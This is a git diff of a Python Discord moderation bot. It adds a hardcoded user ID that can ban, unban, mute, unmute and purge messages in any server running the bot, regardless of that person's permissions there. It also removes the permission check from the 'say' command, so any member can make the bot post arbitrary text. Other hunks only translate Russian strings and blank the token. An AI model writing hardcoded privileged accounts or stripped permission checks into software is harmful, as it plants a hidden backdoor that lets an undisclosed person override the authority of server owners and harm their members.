@@ -11,12 +11,8 @@ import pytz
 import aiohttp
 
 bot = commands.Bot(command_prefix="/", intents=discord.Intents.all())
-developer_id = "1121059810717225030"
 
-def is_admin_or_developer():
-    async def predicate(ctx):
-        return ctx.author.guild_permissions.administrator or ctx.author.id == developer_id
-    return commands.check(predicate)
+SPECIFIC_USER_ID = 1121059810717225030
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -154,14 +150,13 @@ async def warn(ctx, user: Option(discord.Member, description='Select a user')):
         await ctx.respond("Failed to send the warning. Please try again later.")
 
 @bot.command()
-@is_admin_or_developer()
 async def say(ctx, *, message: str):
     await ctx.message.delete()
     await ctx.send(message)  
 
 @bot.slash_command(name='ban', description='Ban a user from the server')
 async def ban(ctx, user: Option(discord.Member, description='Select a user')):
-    if ctx.author.guild_permissions.ban_members:
+    if ctx.author.guild_permissions.ban_members or ctx.author.id == ctx.guild.owner_id or ctx.author.id == SPECIFIC_USER_ID:
         if user == ctx.author:
             await ctx.respond("You cannot ban yourself.")
         elif user.top_role >= ctx.author.top_role:
@@ -174,7 +169,7 @@ async def ban(ctx, user: Option(discord.Member, description='Select a user')):
 
 @bot.slash_command(name='mute', description='Mute a user in the server')
 async def mute(ctx, user: Option(discord.Member, description='Select a user')):
-    if ctx.author.guild_permissions.manage_roles:
+    if ctx.author.guild_permissions.manage_roles or ctx.author.id == ctx.guild.owner_id or ctx.author.id == SPECIFIC_USER_ID:
         muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
         if not muted_role:
             try:
@@ -200,8 +195,7 @@ async def mute(ctx, user: Option(discord.Member, description='Select a user')):
 
 @bot.slash_command(name='unmute', description='Unmute a user in the server')
 async def unmute(ctx, user: Option(discord.Member, description='Select a user')):
-    if ctx.author.guild_permissions.manage_roles:
-        
+    if ctx.author.guild_permissions.manage_roles or ctx.author.id == ctx.guild.owner_id or ctx.author.id == SPECIFIC_USER_ID:
         muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
         if not muted_role:
             await ctx.respond("The 'Muted' role does not exist. Please create it first.")
@@ -217,7 +211,7 @@ async def unmute(ctx, user: Option(discord.Member, description='Select a user'))
 
 @bot.slash_command(name='unban', description='Unban a user from the server')
 async def unban(ctx, user: Option(str, description='User ID to unban')):
-    if ctx.author.guild_permissions.ban_members:
+    if ctx.author.guild_permissions.ban_members or ctx.author.id == ctx.guild.owner_id or ctx.author.id == SPECIFIC_USER_ID:
         try:
             user_obj = await bot.fetch_user(user)
             await ctx.guild.unban(user_obj)
@@ -229,22 +223,19 @@ async def unban(ctx, user: Option(str, description='User ID to unban')):
 
 @bot.slash_command(name='clear', description='Clear messages in a chat')
 async def clear(ctx: discord.ApplicationContext, amount_or_all: str):
-    if amount_or_all.lower() == 'all':
-        if ctx.author.guild_permissions.manage_messages:
+    if ctx.author.guild_permissions.manage_messages or ctx.author.id == ctx.guild.owner_id or ctx.author.id == SPECIFIC_USER_ID:
+        if amount_or_all.lower() == 'all':
             await ctx.channel.purge()
             await ctx.respond("All messages have been deleted.", delete_after=5)
         else:
-            await ctx.respond("You do not have permission to delete messages.")
-    else:
-        try:
-            amount = int(amount_or_all)
-            if ctx.author.guild_permissions.manage_messages:
+            try:
+                amount = int(amount_or_all)
                 await ctx.channel.purge(limit=amount)
                 await ctx.respond(f"{amount} messages have been deleted.", delete_after=5)
-            else:
-                await ctx.respond("You do not have permission to delete messages.")
-        except ValueError:
-            await ctx.respond("Invalid command usage. Please provide a number or 'all'.")
+            except ValueError:
+                await ctx.respond("Invalid command usage. Please provide a number or 'all'.")
+    else:
+        await ctx.respond("You do not have permission to delete messages.")
 
 @bot.slash_command(name='trivia', description='Answer a random trivia question')
 async def trivia(ctx):
@@ -962,7 +953,7 @@ async def flag_game(ctx):
 
     await ctx.respond(embed=embed, view=FlagGameView(ctx, country))
 
-@bot.slash_command(name="joke", description="Выводит случайную шутку")
+@bot.slash_command(name="joke", description="Sending a random joke")
 async def joke(ctx):
     async with aiohttp.ClientSession() as session:
         async with session.get("https://v2.jokeapi.dev/joke/Any?blacklistFlags=nsfw,racist,sexist,explicit") as response:
@@ -974,10 +965,9 @@ async def joke(ctx):
                     joke = f'{data["setup"]} - {data["delivery"]}'
                 await ctx.respond(joke)
             else:
-                await ctx.respond("Не удалось получить шутку, попробуйте позже.")
+                await ctx.respond("Try again later please.")
 
 @bot.message_command(name="Get Message ID")
 async def get_message_id(ctx, message: discord.Message):
     await ctx.respond(f"Message ID: `{message.id}`")
-
-bot.run("")
+bot.run('')
